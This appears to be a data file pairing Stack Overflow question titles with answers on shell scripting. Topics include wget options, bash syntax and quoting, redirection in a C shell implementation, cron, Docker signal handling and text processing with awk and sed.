    "Using wget to recursively fetch a directory with --no-parent": "You need to add a trailing slash to indicate the last item in the URL is a directory and not a file:\nwget -r -N --no-parent -nH -P /media/karunakar --ftp-user=jsjd --ftp-password='hdshd' ftp://ftp.xyz.com/Suppliers/my/ORD20130908\n\u2193\nwget -r -N --no-parent -nH -P /media/karunakar --ftp-user=jsjd --ftp-password='hdshd' ftp://ftp.xyz.com/Suppliers/my/ORD20130908/\nFrom the documentation:\nNote that, for HTTP (and HTTPS), the trailing slash is very important to \u2018--no-parent\u2019. HTTP has no concept of a \u201cdirectory\u201d\u2014Wget relies on you to indicate what\u2019s a directory and what isn\u2019t. In \u2018http://foo/bar/\u2019, Wget will consider \u2018bar\u2019 to be a directory, while in \u2018http://foo/bar\u2019 (no trailing slash), \u2018bar\u2019 will be considered a filename (so \u2018--no-parent\u2019 would be meaningless, as its parent is \u2018/\u2019).",
    "Why does 'until' exist?": "Bash supports it because it conforms to POSIX - specifically, IEEE Std 1003.1, 2004 Edition - Shell Command Language - The until Loop. The feature predates GNU, and GNU bash repo has it since the 1st commit 21 years ago.\nAs Guillaume also explains in another answer, the rationale behind the feature was (a misguided attempt at) readability. They tried to micromanage things here because shell language was initially targeted at end users rather than professional programmers (like BASIC and SQL).\nHowever, such redundant syntax that does exactly the same thing at the same code complexity proved to be more trouble than it's worth: by providing two, rather than one, canonical forms for a stock construct, it actually hurt readability rather than improve it and introduced unnecessary decisions to make1. That's why it's only present in a few languages designed around that time and likewise intended to be \"close to natural language\" - like Perl and Visual Basic.\nNowadays, this approach has evolved into the syntax sugar concept2: a redundant construct is only introduced if it significantly simplifies code by replacing an entire boilerplate construct that is used sufficiently often. C# is a good example of this.\n1\"which one to use here? change it when I change the condition or not? why do I even care?\" From my experience, it's the same in Pascal procedures vs functions: I remember having to switch a subroutine between these two multiple times as I design the code. It simply imposes redundant work on the programmer, thus wasting their time.\n2I narrow down the term here because I'm expressing things from a language designer's point of view. It's rather \"what is now considered good syntax sugar\". Since from a language designer's POV, any other SS effectively doesn't exist.",
    "Why should I learn Shell Programming? [closed]": "There are a billion and one reasons to learn shell programming. One of the major reasons is systems administration.\nHere is an example of somebody who needed to rename ~750 files based upon another file in that same directory. This was accomplished with 3 lines of shell scripting. To get many more examples just search for questions with the tags [bash], [sed] or [awk].\nWhen somebody asks me to show them a cool example of \"shell programming\" I always show them this awk 1-liner (maybe even a 1-worder?). It will filter a list to only show unique values without changing the original order. This is significant because most other solutions require you to sort the list first which destroys the original order.\n$ echo -e \"apple\\npear\\napple\\nbanana\\nmango\\npear\\nbanana\" | awk '!a[$0]++'\napple\npear\nbanana\nmango\nExplanation of awk command\nThe non-sorting unique magic happens with !a[$0]++. Since awk supports associative arrays, it uses the current record (aka line) $0 as the key to the array a[]. If that key has not been seen before, a[$0] evaluates to 0 (zero) which is awk's default value for unset indices. We then negate this value to return TRUE on the first occurrence of that key. a[$0] is then incremented such that subsequent hits on this key will return FALSE and thus repeat values are never printed. We also exploit the fact that awk will default to print $0 (print the current record/line) if an expression returns TRUE and no further { commands } are given.\nIf you still don't understand, don't worry, this is a very terse and optimized version of what could be a much longer awk script.",
    "How to accept command-line args ending in backslash": "That's likely the shell treating \\ as an escape character, and thus escaping the character. So the shell sends \\\" as \" (because it thinks you are trying to escape the double quote). The solution is to escape the escape character, like so: $ python args.py \"hello\\world\\\\\".",
    "Bash: replacing a substring in pipe stdin": "You can use the command sed.\ncat file1 file2 | sed -e 's/@path_to_file/path/to/file/' ...",
    "What is the difference between alias and export (and a function!)[BASH]?": "You're asking about two very different categories of things: aliases and functions define things that act like commands; export marks a variable to be exported to child processes. Let me go through the command-like things first:\nAn alias (alias ll='ls -l') defines a shorthand for a command. They're intended for interactive use (they're actually disabled by default in shell scripts), and are simple but inflexible. For example, any arguments you specify after the alias simply get tacked onto the end of the command; if you wanted something like alias findservice='grep \"$1\" /etc/services', you can't do it, because $1 doesn't do anything useful here.\nA function is like a more flexible, more powerful version of an alias. Functions can take & process arguments, contain loops, conditionals, here-documents, etc... Basically, anything you could do with a shell script can be done in a function. Note that the standard way to define a function doesn't actually use the keyword function, just parentheses after the name. For example: findservice() { grep \"$1\" /etc/services; }\nOk, now on to shell variables. Before I get to export, I need to talk about unexported variables. Basically, you can define a variable to have some (text) value, and then if you refer to the variable by $variablename it'll be substituted into the command. This differs from an alias or function in two ways: an alias or function can only occur as the first word in the command (e.g. ll filename will use the alias ll, but echo ll will not), and variables must be explicitly invoked with $ (echo $foo will use the variable foo, but echo foo will not). More fundamentally, aliases and functions are intended to contain executable code (commands, shell syntax, etc), while variables are intended to store non-executable data.\n(BTW, you should almost always put variable references inside double-quotes -- that is, use echo \"$foo\" instead of just echo $foo. Without double-quotes the variable's contents get parsed in a somewhat weird way that tends to cause bugs.)\nThere are also some \"special\" shell variables, that are automatically set by the shell (e.g. $HOME), or influence how the shell behaves (e.g. $PATH controls where it looks for executable commands), or both.\nAn exported variable is available both in the current shell, and also passed to any subprocesses (subshells, other commands, whatever). For example, if I do LC_ALL=en_US.UTF-8, that tells my current shell use the \"en_US.UTF-8\" locale settings. On the other hand, if I did export LC_ALL=en_US.UTF-8 that would tell the current shell and all subprocesses and commands it executes to use that locale setting.\nNote that a shell variable can be marked as exported separately from defining it, and once exported it stays exported. For example, $PATH is (as far as I know) always exported, so PATH=/foo:/bar has the same effect as export PATH=/foo:/bar (although the latter may be preferred just in case $PATH somehow wasn't already exported).\nIt's also possible to export a variable to a particular command without defining it in the current shell, by using the assignment as a prefix for the command. For example LC_ALL=en_US.UTF-8 sort filename will tell the sort command to use the \"en_US.UTF-8\" locale settings, but not apply that to the current shell (or any other commands).",
    "Check the output of a command in shell script": "[ is actually a command in linux (like bash or cat or grep).\n$(grep $file failed.txt -c) is a command substitution which in your case evaluated to 0. Thus the line now reads [0 -ne 0], which is interpreted as run a program called [0 with arguments -ne 0].\nWhat you should write instead is [ $(grep $file failed.txt -c) -ne 0 ]. Shell scripts require that there be spaces between the opening and closing square braces. Otherwise you change the command that is executed (the closing ] indicates that there are no more arguments to be read.\nSo now the command evaluates to [ 0 -ne 0 ]. You can try executing this in your shell to see what happens. [ exits with a value of 0 if the expression is true and 1 if it is false. You can see the exit value by echoing $? (the exit value of the last command to be run).",
    "Splitting /proc/cmdline arguments with spaces": "set -- $(cat /proc/cmdline)\nfor x in \"$@\"; do\n    case \"$x\" in\n        wlan=*)\n        echo \"${x#wlan=}\"\n        ;;\n    esac\ndone",
    "Implementing shell in C and need help handling input/output redirection": "You have way too many file descriptors open after your redirection. Let's dissect the two paragraphs:\nif (in) { //if '<' char was found in string inputted by user\n    fd = open(input, O_RDONLY, 0);\n    dup2(fd, STDIN_FILENO);\n    in = 0;\n    current_in = dup(0);  // Fix for symmetry with second paragraph\n}\n\nif (out) { //if '>' was found in string inputted by user\n    fd = creat(output, 0644);\n    dup2(fd, STDOUT_FILENO);\n    out = 0;\n    current_out = dup(1);\n}\nI'm going to be charitable and ignore the fact that you are ignoring errors. However, you will need to error check your system calls.\nIn the first paragraph, you open a file and capture the file descriptor (it might well be 3) in the variable fd. You then duplicate the file descriptor over standard input (STDIN_FILENO). Note, though, that file descriptor 3 is still open. Then you do a dup(0) (which, for consistency, should be STDIN_FILENO), getting another file descriptor, perhaps 4. So you have file descriptors 0, 3 and 4 pointing at the same file (and, indeed, the same open file description \u2014 noting that an open file description is different from an open file descriptor). If your intention with current_in was to preserve the (parent) shell's standard input, you have to do that dup() before you do the dup2() that overwrites the output. However, you would be better off not altering the parent shell's file descriptors; it is less overhead than re-duplicating the file descriptors.\nThen you more or less repeat the process in the second paragraph, first overwriting the only record of file descriptor 3 being open with the fd = creat(...) call but obtaining a new descriptor, perhaps 5, then duplicating that over standard output. You then do a dup(1), yielding another file descriptor, perhaps 6.\nSo, you have stdin and stdout of the main shell redirected to the files (and no way of reinstating those to the original values). Your first problem, therefore, is that you are doing the redirection before you fork(); you should be doing it after the fork() \u2014 though when you get to piping between processes, you will need to create pipes before forking.\nYour second problem is that you need to close a plethora of file descriptors, one of which you no longer have a reference for.\nSo, you might need:\nif ((pid = fork()) < 0)\n    ...error...\nelse if (pid == 0)\n{\n    /* Be childish */\n    if (in)\n    {\n        int fd0 = open(input, O_RDONLY);\n        dup2(fd0, STDIN_FILENO);\n        close(fd0);\n    }\n\n    if (out)\n    {\n        int fd1 = creat(output , 0644) ;\n        dup2(fd1, STDOUT_FILENO);\n        close(fd1);\n    }\n    ...now the child has stdin coming from the input file, \n    ...stdout going to the output file, and no extra files open.\n    ...it is safe to execute the command to be executed.\n    execve(cmd[0], cmd, env);   // Or your preferred alternative\n    fprintf(stderr, \"Failed to exec %s\\n\", cmd[0]);\n    exit(1);\n}\nelse\n{\n    /* Be parental */\n    ...wait for child to die, etc...\n}\nBefore you do any of this, you should ensure that you've already flushed the shell's standard I/O channels, probably by using fflush(0), so that if the forked child writes to standard error because of a problem, there is no extraneous duplicated output.\nAlso note that the various open() calls should be error-checked.",
    "Is is possible to put into clipboard the result of a shell command?": "Depends. Linux, Mac or Windows?\nThe mac has the commands pbcopy and pbpaste to copy and paste something from the clipboard.\nCopy example (mac):\necho $PATH | pbcopy\nPaste Example (mac):\necho \"$(pbpaste -Prefer txt)\"\nLinux uses X which has multiple copy-paste buffers (somewhat akin to the clipboard, but a little more involved).\nYou can use a little application like XSel to copy/paste, The command would be used in the same form as the pbcopy/pbpaste\nCopy:\necho $PATH | xsel --clipboard\n'paste':\necho \"$(xsel --output --clipboard)\"\nFor windows, you can use an app like clip, which allows the same copy/paste functionality\nCopy:\nset %PATH% | clip\nI generally use Linux/Unix so I don't have the equivalent for pasting from the clipboard on Windows.",
    "How to use parallel execution in a shell script?": "Convert this into a Makefile with proper dependencies. Then you can use make -j to have Make run everything possible in parallel.\nNote that all the indents in a Makefile must be TABs. TAB shows Make where the commands to run are.\nAlso note that this Makefile is now using GNU Make extensions (the wildcard and subst functions).\nIt might look like this:\nexport PATH := .:${PATH}\n\nFILES=$(wildcard file*)\nRFILES=$(subst file,r,${FILES})\n\nfinal: combine ${RFILES}\n    combine ${RFILES} final\n    rm ${RFILES}\n\nex: example.c\n\ncombine: combine.c\n\nr%: file% ex\n    ex $< $@",
    "Linux ssh bash fork retry: no child processes": "Run kill -9 -1 from the user login that caused the forkbomb . No need to reboot. PS: Consult your seniors before running it on Prod server",
    "How to load bash command history from file": "The following will append the contents of file.txt to the current in-memory history list:\nhistory -r file.txt\nYou can optionally run history -c before this to clear the in-memory history.",
    "OpenSSL create SHA hash from shell stdin": "Try echo -n \"password\".\nWhat's happening is the new line character(s) that echo adds to the end of the string are getting hashed. The -n to echo suppresses this behavior.",
    "Bash script pattern matching": "Use a character class: [0-9] matches 0, 9, and every character between them in the character set, which - at least in Unicode (e.g. UTF-8) and subset character sets (e.g. US-ASCII, Latin-1) - are the digits 1 through 8. So it matches any one of the 10 Latin digits.\nif [[ $var1 == *,123[0-9][0-9][0-9],* ]] ; then echo \"Pattern matched\"; fi\nUsing =~ instead of == changes the pattern type from shell standard \"glob\" patterns to regular expressions (\"regexes\" for short). You can make an equivalent regex a little shorter:\nif [[ $var1 =~ ,123[0-9]{3}, ]] ; then echo \"Pattern matched\"; fi\nThe first shortening comes from the fact that [[ =~ ]] only requires the regex to match any part of the string, not the whole thing. Therefore you don't need the equivalent of the leading and trailing *s that you find in the glob pattern.\nThe second length reduction is due to the {n} syntax, which lets you specify a number of repetitions of the previous pattern without actually repeating the pattern itself in the regex. (You can also match any of a range of repetition counts by specifying a minimum and maximum: [0-9]{2,4} will match either two, three, or four digits in a row.)\nIt's worth noting that you could also use a named character class to match digits. Depending on your locale, [[:digit:]] may be exactly equivalent to [0-9], or it may include characters from other scripts with the Unicode \"Number, Decimal Digit\" property.\nif [[ $var1 =~ ,123[[:digit:]]{3}, ]] ; then echo \"Pattern matched\"; fi",
    "What does this error mean? (SC2129: Consider using { cmd1; cmd2; } >> file instead of individual redirects.)": "If you click in the message given by shellcheck, you will arrive to https://github.com/koalaman/shellcheck/wiki/SC2129\nThere you can find the following:\nProblematic code:\necho foo >> file\ndate >> file\ncat stuff  >> file\nCorrect code:\n{ \n  echo foo\n  date\n  cat stuff\n} >> file\nRationale:\nRather than adding >> something after every single line, you can simply group the relevant commands and redirect the group.\nExceptions\nThis is mainly a stylistic issue, and can freely be ignored.\nSo basically replace:\necho \"---\" > \"$file_path\"\n{\n    echo \"title: \\\"$title\\\"\"\n}   >> \"$file_path\"\n\necho \"layout: post\" >> \"$file_path\"\necho \"tags: \" >> \"$file_path\"\necho \"---\" >> \"$file_path\"\nWith:\n{\n    echo \"---\"\n    echo \"title: \\\"$title\\\"\"\n    echo \"layout: post\"\n    echo \"tags: \"\n    echo \"---\"\n}   > \"$file_path\"\nEven though I would suggest you to use a heredoc:\ncat >\"$file_path\" <<EOL\n---\ntitle: \"$title\"\nlayout: post\ntags: \n---\nEOL",
    "ansible: Is there something like with_fileglobs for files on remote machine?": "A clean Ansible way of purging unwanted files matching a glob is:\n- name: List all tmp files\n  find:\n    paths: /tmp/foo\n    patterns: \"*.tmp\"\n  register: tmp_glob\n\n- name: Cleanup tmp files\n  file:\n    path: \"{{ item.path }}\"\n    state: absent\n  with_items:\n    - \"{{ tmp_glob.files }}\"",
    "Use PS0 and PS1 to display execution time of each bash command": "I was looking for a solution to a different problem and came upon this question, and decided that sounds like a cool feature to have. Using @Scheff's excellent answer as a base in addition to the solutions I developed for my other problem, I came up with a more elegant and full featured solution.\nFirst, I created a few functions that read/write the time to/from memory. Writing to the shared memory folder prevents disk access and does not persist on reboot if the files are not cleaned for some reason\nfunction roundseconds (){\n  # rounds a number to 3 decimal places\n  echo m=$1\";h=0.5;scale=4;t=1000;if(m<0) h=-0.5;a=m*t+h;scale=3;a/t;\" | bc\n}\n\nfunction bash_getstarttime (){\n  # places the epoch time in ns into shared memory\n  date +%s.%N >\"/dev/shm/${USER}.bashtime.${1}\"\n}\n\nfunction bash_getstoptime (){\n  # reads stored epoch time and subtracts from current\n  local endtime=$(date +%s.%N)\n  local starttime=$(cat /dev/shm/${USER}.bashtime.${1})\n  roundseconds $(echo $(eval echo \"$endtime - $starttime\") | bc)\n}\nThe input to the bash_ functions is the bash PID\nThose functions and the following are added to the ~/.bashrc file\nROOTPID=$BASHPID\nbash_getstarttime $ROOTPID\nThese create the initial time value and store the bash PID as a different variable that can be passed to a function. Then you add the functions to PS0 and PS1\nPS0='$(bash_getstarttime $ROOTPID) etc..'\nPS1='\\[\\033[36m\\] Execution time $(bash_getstoptime $ROOTPID)s\\n'\nPS1=\"$PS1\"'and your normal PS1 here'\nNow it will generate the time in PS0 prior to processing terminal input, and generate the time again in PS1 after processing terminal input, then calculate the difference and add to PS1. And finally, this code cleans up the stored time when the terminal exits:\nfunction runonexit (){\n  rm /dev/shm/${USER}.bashtime.${ROOTPID}\n}\n\ntrap runonexit EXIT\nPutting it all together, plus some additional code being tested, and it looks like this:\nThe important parts are the execution time in ms, and the user.bashtime files for all active terminal PIDs stored in shared memory. The PID is also shown right after the terminal input, as I added display of it to PS0, and you can see the bashtime files added and removed.\nPS0='$(bash_getstarttime $ROOTPID) $ROOTPID experiments \\[\\033[00m\\]\\n'",
    "Windows CMD: How to create symbolic link to executable file?": "Most programs will not run from places other than they install location - which is exactly what happens when you try to run it from symlink.\nIt would be much easier to create CMD/BAT files in that folder with matching names which will launch programs from locations you want:\nREM chrome.cmd\nstart /b cmd /c \"C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe\" %*",
    "End of line (new line) escapes in Bash": "Actually, \\n is not really a newline character\u2014it is an escape sequence that represents a newline (which is just one character in Linux). The \\ at the end of a line escapes the actual newline character that you type in using the enter key. You can look at what ASCII values represent different characters using hexdump:\n%echo $'\\\\n'\n\\n\n%echo $'\\\\n' | hexdump -C\n00000000  5c 6e 0a                   |\\n.|\n00000003\nYou will notice that echo printed out 3 characters: \\ (5c), n (6e), and a newline (0a). You will also notice that on the right hand side of the hexdump output, newline shows up as a \".\", because it is considered a non-printing character.",
    "How to handle JMESPath contains filter on attribute that may be null?": "",
    "Bash script execution with and without shebang in Linux and BSD": "Since this happens in dash and dash is simpler, I looked there first.\nSeems like exec.c is the place to look, and the relevant functionis are tryexec, which is called from shellexec which is called whenever the shell things a command needs to be executed. And (a simplified version of) the tryexec function is as follows:\nSTATIC void\ntryexec(char *cmd, char **argv, char **envp)\n{\n        char *const path_bshell = _PATH_BSHELL;\n\nrepeat:\n\n        execve(cmd, argv, envp);\n\n        if (cmd != path_bshell && errno == ENOEXEC) {\n                *argv-- = cmd;\n                *argv = cmd = path_bshell;\n                goto repeat;\n        }\n}\nSo, it simply always replaces the command to execute with the path to itself (_PATH_BSHELL defaults to \"/bin/sh\") if ENOEXEC occurs. There's really no magic here.\nI find that FreeBSD exhibits identical behavior in bash and in its own sh.\nThe way bash handles this is similar but much more complicated. If you want to look in to it further I recommend reading bash's execute_command.c and looking specifically at execute_shell_script and then shell_execve. The comments are quite descriptive.",
    "Redirect nohup's stderr to nohup.out [duplicate]": "Try this\nnohup 2>&1 Ex.exe &",
    "Using IPython from the Python shell like `code.interact()`": "In IPython 0.11 the API has been overhauled and the shell is even easier to invoke:\nimport IPython\n\nIPython.embed()",
    "What is the difference between makefile and sh file": "make automatically checks (based on time stamps) which targets need to be remade and which ones can be left untouched. If you write your own shell script, you'll either have to program this logic yourself or else all your components will be rebuilt when you run your script - even those that haven't changed since the last build.",
    "Capture output of a bash command, parse it and store into different bash variables": "$ read IPETH0 IPLO <<< $(ifconfig | awk '/inet[[:space:]]/ { print $2 }')\n$ echo \"${IPETH0}\"\n192.168.23.2\n$ echo \"${IPLO}\"\n127.0.0.1\nThis assumes the order of the eth0 and lo interfaces, but it shows the basic idea.",
    "Shell Script to download youtube files from playlist": "OK so after further research and updating my version of youtube-dl, it turns out that this functionality is now built directly into the program, negating the need for a shell script to solve the playlist download issue on youtube. The full documentation can be found here: (http://rg3.github.com/youtube-dl/documentation.html) but the simple solution to my original question is as follows:\n1) youtube-dl will process a playlist link automatically, there is no need to individually feed it the URLs of the videos that are contained therein (this negates the need to use grep to search for \"watch?\" to find the unique video id\n2) there is now an option included to format the filename with a variety of options including:\nid: The sequence will be replaced by the video identifier.\nurl: The sequence will be replaced by the video URL.\nuploader: The sequence will be replaced by the nickname of the person who uploaded the video.\nupload_date: The sequence will be replaced by the upload date in YYYYMMDD format.\ntitle: The sequence will be replaced by the literal video title.\next: The sequence will be replaced by the appropriate extension (like flv or mp4).\nepoch: The sequence will be replaced by the Unix epoch when creating the file.\nautonumber: The sequence will be replaced by a five-digit number that will be increased with each download, starting at zero.\nthe syntax for this output option is as follows (where NAME is any of the options shown above):\nyoutube-dl -o '%(NAME)s' http://www.youtube.com/your_video_or_playlist_url\nAs an example, to answer my original question, the syntax is as follows:\nyoutube-dl -o '%(title)s.%(ext)s' http://www.youtube.com/playlist?list=PL2284887FAE36E6D8&feature=plcp\nThanks again to those who responded to my question, your help is greatly appreciated.",
    "Is nesting of Here Document possible in a unix bash script?": "Yes\nHowever, the nested heredoc terminator will only be recognized when indented if the indentation is done with actual tabs. Spaces won't work.\nSo you probably want to do something more like:\nssh s1 << \\eof1\n  ssh s2 << \\eof2\n    hostname\neof2\neof1",
    "why is this simple FOR LOOP in my Linux bash not working?": "You didn't mention how you were executing your script and that can make a difference. Suppose we have a script:\n$ cat welcome.sh\nfor i in {1..3}\ndo\n   echo \"Welcome $i times\"\ndone\necho \"\\n\"\nObserve the following three invocations of welcome.sh from a bash shell:\n$ ps -p $$\n  PID TTY          TIME CMD\n11509 pts/25   00:00:00 bash\n$ source welcome.sh\nWelcome 1 times\nWelcome 2 times\nWelcome 3 times\n\n$ bash welcome.sh\nWelcome 1 times\nWelcome 2 times\nWelcome 3 times\n\n$ sh welcome.sh\nWelcome {1..3} times\nThe last one fails because, on my system, sh defaults to dash, not bash. This is true, for example, for any modern Debian/Ubuntu-derived system.",
    "Get the latest file in directory [duplicate]": "Add the -d argument to ls. That way it will always print just what it's told, not look inside directories.",
    "Golang requirements.txt equivalent": "The command go get does exactly what you need: It finds all dependencies and downloads and installs the missing ones. Focus on \"all\": go get really traverses your dependency graph.\nHave a look at the documentation:\nhttps://golang.org/cmd/go/#hdr-Add_dependencies_to_current_module_and_install_them\nThe Go documentation is really clean, short and well written. I would recommend always to have a look at the documentation first before making assumptions which are based on experience with other tools or tool-chains.\nThey also provide useful blog posts, https://blog.golang.org/using-go-modules",
    "Docker bash shell script does not catch SIGINT or SIGTERM": "Actually, your Dockerfile and start.sh entrypoint script work as is for me with Ctrl+C, provided you run the container with one of the following commands:\ndocker run --name tmp -it tmp\ndocker run --rm -it tmp\nDocumentation details\nAs specified in docker run --help:\nthe --interactive = -i CLI flag asks to keep STDIN open even if not attached\n(typically useful for an interactive shell, or when also passing the --detach = -d CLI flag)\nthe --tty = -t CLI flag asks to allocate a pseudo-TTY\n(which notably forwards signals to the shell entrypoint, especially useful for your use case)\nRelated remarks\nFor completeness, note that there are several related issues that can make docker stop take too much time and \"fall back\" to docker kill, which can arise when the shell entrypoint starts some other process(es):\nFirst, when the last line of the shell entrypoint runs another, main program, don't forget to prepend this line with the exec builtin:\nexec prog arg1 arg2 ...\nBut when the shell entrypoint is intended to run for a long time, trapping signals (at least INT / TERM, but not KILL) is very important;\n{see also this SO question: Docker Run Script to catch interruption signal}\nOtherwise, if the signals are not forwarded to the children processes, we run the risk of hitting the \"PID 1 zombie reaping problem\", for instance\n{see also this SO question for details: Speed up docker-compose shutdown}",
    "Does it matter if exclamation point is inside or outside brackets in Bash conditionals?": "No, it is completely up to your own preference. The next commands are completely equivalent:\nif [[ $x -ne $y ]]; then\nif ! [[ $x -eq $y ]]; then\nif [[ ! $x -eq $y ]]; then\nYour preferences might be based on different if conditions:\nif [[ $x -ne $y ]]; then: Simple comparisons without any complexity like ordinary variable comparison.\nif ! [[ $x -eq $y ]]; then: Suppose you have a complex if condition that might be a result of some function instead of $x -eq $y.\nif [[ ! $x -eq $y ]]; then: Unnecessary, use either first or second, depending on what type of if condition you have. I would never use this one!",
    "With set -e, is it possible to ignore errors for certain commands? [duplicate]": "Add || : (or anything else that is guaranteed not to fail but that's the simplest) to the end of the command.\nThough many people would simply tell you that set -e isn't worth it because it isn't as useful as you might think (and causes issues like this) and manual error checking is a better policy.\n(I'm not in that camp yet though the more I run into issues like this the more I think I might get there one day.)\nFrom thatotherguy's comment explaining one of major the issues with set -e:\nThe problem with set -e isn't that you have to be careful about which commands you want to allow to fail. The problem is that it doesn't compose. If someone else reads this post and uses source yourfile || : to source this script while allowing failure, suddenly yourfile will no longer stop on errors anywhere. Not even on failing lines after an explicit set -e.",
    "Java Execute Shell Script Bundled within JAR [duplicate]": "Its not about Java, its about shell. As far as I know shell interpreter can't execute scripts that reside in the zip file. So you have a couple of options here:\nRead the shell script as a text file from within your java program. create a temporal file (in temp dir or any other relevant place and copy the content of the file there. And then call the shell interpreter with this temporal script. I believe its the best approach\nSince jar is a zip, you can unzip it from within the shell find a script and execute the shell. Again this is more awkward and rather wrong, but technically it should work.\nIf you don't have low level stuff in your script, you can consider to rewrite the logic to groovy script (maybe you'll find useful groosh project). Then call the groovy code from the memory and not from the file.\nWell, I'm out of ideas, If I were you, I would implement the first solution :) Good luck and hope this helps",
    "Linux shell equivalent on IIS": "Depending on what version of IIS you're considering, I would second lbrandy's recommendation to check out PowerShell. Microsoft is working on a PowerShell provider for IIS (specifically version 7). There is a decent post about this at http://blogs.iis.net/thomad/archive/2008/04/14/iis-7-0-powershell-provider-tech-preview-1.aspx. The upcoming version of PowerShell will also add remoting capabilities so that you can remotely manage machines. PowerShell is quite different from *NIX shells, though, so that is something to consider.\nHope this helps.",
    "is there a way to check if a bash script is complete or not?": "bash -n -c \"$command_text\"\n...will determine whether your $command_text is a syntactically valid script without actually executing it.\nNote that there's a huge breadth of space between \"syntactically valid\" and \"correct\". Consider adopting something like http://shellcheck.net/ if you want to properly parse the language.",
    "Why do shells ignore SIGINT and SIGQUIT in backgrounded processes?": "When a shell runs a program in the background, the background process is not supposed to be tied to the original shell any more -- the shell can exit or be killed, and the background process should continue running.\nIf the shell is interactive and job control is being used, it puts the background process in a separate process group, so signals sent to the shell process group don't affect it.\nBut when job control is not being used, which is the default in non-interactive shells, the background process is in the same process group. To avoid the background process receiving keyboard signals that are just intended for the shell, it apparently ignores those signals in those child processes.",
    "Using wget to download an entire folder from github [closed]": "The file that wget downloaded is actually an html page that is the \"view\" that you see when you access the URL (that you had given).\nThe github webpage is just a \"frontend\" to the git code. To access the code, you need to either access the github link via GIT, or you can download the various released versions of the software from the Releases page of onepage-scroll\nThat said, you can take a look at this: Download a single folder or directory from a GitHub repo\nHope this helps.",
    "Get last element in Bash array": "As far as I can see in https://tiswww.case.edu/php/chet/bash/CHANGES, the new feature is in this part :\nThis document details the changes between this version, bash-4.3-alpha, and the previous version, bash-4.2-release.\n...\nx. The shell now allows assigning, referencing, and unsetting elements of indexed arrays using negative subscripts (a[-1]=2, echo ${a[-1]}) which count back from the last element of the array.\nThe fix in :\nThis document details the changes between this version, bash-4.3-beta2, and theprevious version, bash-4.3-beta.\n1 Changes to Bash\na. Fixed a bug that caused assignment to an unset variable using a negative subscript to result in a segmentation fault.\nb. Fixed a bug that caused assignment to a string variable using a negative subscript to use the incorrect index.\nIt a fix of a new feature in Bash 4.3.",
    "How can I add an existing google account on an Android device from command line?": "",
    "Why does \\$ reduce to $ inside backquotes [though not inside $(...)]?": "By adding a \\, you make the inner subshell expand it instead of the outer shell. A good example would be to actually force the starting of a new shell, like this:\n$ echo $$\n4988\n$ echo `sh -c 'echo $$'`\n4988\n$ echo `sh -c 'echo \\$\\$'`\n4990\n$ echo `sh -c 'echo \\\\\\$\\\\\\$'`\n$$",
    "How to delete every other file in a directory from a shell command?": "This should do the trick:\nrm -f *[13579].png\nwhich would exterminate every file which name ends with 1 or 3 or 5 or 7 or 9 plus trailing .png suffix.\nNote: * used in pattern matches 0 or more characters so foo1.png would be removed, but so would 1.png.",
    "First character of a variable in a shell script to uppercase?": "If:\ns=somemodule\nwith bash v4+\necho ${s^}\nThis should work with a bit older bash versions (from Glenn):\necho $(tr a-z A-Z <<< ${s:0:1})${s:1}\")\nwith zsh\necho ${(C)s}\nwith ash and coreutils\necho $(echo $s | cut -c1 | tr a-z A-Z)$(echo $s | cut -c2-)\nwith GNU sed\necho $s | sed 's/./\\U&/'\nwith BSD sed\necho $s | sed '\n  h;\n  y/quvwxzdermatoglyphicsbfjkn/QUVWXZDERMATOGLYPHICSBFJKN/;\n  G;\n  s/\\(.\\)[^\\n]*\\n.\\(.*\\)/\\1\\2/;\n'\nwith awk\necho $s | awk '{ print toupper(substr($0, 1, 1)) substr($0, 2) }'\nwith perl\necho $s | perl -nE 'say ucfirst'\nwith python\necho $s | python -c 'import sys; print sys.stdin.readline().rstrip().capitalize()'\nwith ruby\necho $s | ruby -e 'puts ARGF.read.capitalize'\nOutput in all cases\nSomemodule",
    "Shell script not running via crontab, but runs fine manually": "finally i found a solution ... instead of entering the cronjob with\ncrontab -e\ni needed to edit the crontab file directly\nnano /etc/crontab\nadding e.g. something like\n*/5 *     * * *   root  /bin/bash /var/scripts/vpn-check.sh\nand its fine now!\nThank you all for your help ... hope my solution will help other people as well.",
    "How can I remove the first part of a string in Bash?": "You should have a look at info cut, which will explain what f1 means.\nActually we just need fields after(and) the second field. -f tells the command to search by field, and 2- means the second and following fields.\necho \"first second third etc\" | cut -d \" \" -f2-",
    "Check if program is running with bash shell script?": "You can achieve almost everything in PROCESS_NUM with this one-liner:\n[ `pgrep $1` ] && return 1 || return 0\nif you're looking for a partial match, i.e. program is named foobar and you want your $1 to be just foo you can add the -f switch to pgrep:\n[[ `pgrep -f $1` ]] && return 1 || return 0\nPutting it all together your script could be reworked like this:\n#!/bin/bash\n\ncheck_process() {\n  echo \"$ts: checking $1\"\n  [ \"$1\" = \"\" ]  && return 0\n  [ `pgrep -n $1` ] && return 1 || return 0\n}\n\nwhile [ 1 ]; do \n  # timestamp\n  ts=`date +%T`\n\n  echo \"$ts: begin checking...\"\n  check_process \"dropbox\"\n  [ $? -eq 0 ] && echo \"$ts: not running, restarting...\" && `dropbox start -i > /dev/null`\n  sleep 5\ndone\nRunning it would look like this:\n# SHELL #1\n22:07:26: begin checking...\n22:07:26: checking dropbox\n22:07:31: begin checking...\n22:07:31: checking dropbox\n\n# SHELL #2\n$ dropbox stop\nDropbox daemon stopped.\n\n# SHELL #1\n22:07:36: begin checking...\n22:07:36: checking dropbox\n22:07:36: not running, restarting...\n22:07:42: begin checking...\n22:07:42: checking dropbox\nHope this helps!",
    "Cartesian product of two files (as sets of lines) in GNU/Linux": "Here's shell script to do it\nwhile read a; do while read b; do echo \"$a, $b\"; done < file2; done < file1\nThough that will be quite slow. I can't think of any precompiled logic to accomplish this. The next step for speed would be to do the above in awk/perl.\nawk 'NR==FNR { a[$0]; next } { for (i in a) print i\",\", $0 }' file1 file2\nHmm, how about this hacky solution to use precompiled logic?\npaste -d, <(sed -n \"$(yes 'p;' | head -n $(wc -l < file2))\" file1) \\\n          <(cat $(yes 'file2' | head -n $(wc -l < file1)))",
    "Syntax error: end of file unexpected (expecting \"then\") [duplicate]": "I have met the same problem. And the problem is the format of the file is \"dos\", but in linux shell requires \"unix\", so I install the \"dos2unix\"\n$ sudo apt-get install dos2unix\nor if you use emacs, you can do this:\nC-x RET f unix\nGood luck :)",
